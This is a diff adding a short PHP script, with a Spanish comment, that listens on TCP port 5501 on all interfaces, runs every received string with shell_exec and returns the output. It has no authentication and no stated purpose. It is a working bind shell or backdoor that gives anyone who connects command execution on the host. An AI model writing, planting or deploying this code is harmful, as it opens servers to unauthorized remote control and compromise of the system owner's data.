@@ -1,0 +1,17 @@
+<?php
+$ip = '0.0.0.0'; // Escuchar en todas las interfaces
+$port = 5501;
+
+$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_bind($sock, $ip, $port);
+socket_listen($sock);
+
+while ($conn = socket_accept($sock)) {
+    $cmd = socket_read($conn, 2048);
+    $output = shell_exec($cmd);
+    socket_write($conn, $output, strlen($output));
+    socket_close($conn);
+}
+
+socket_close($sock);
+?>
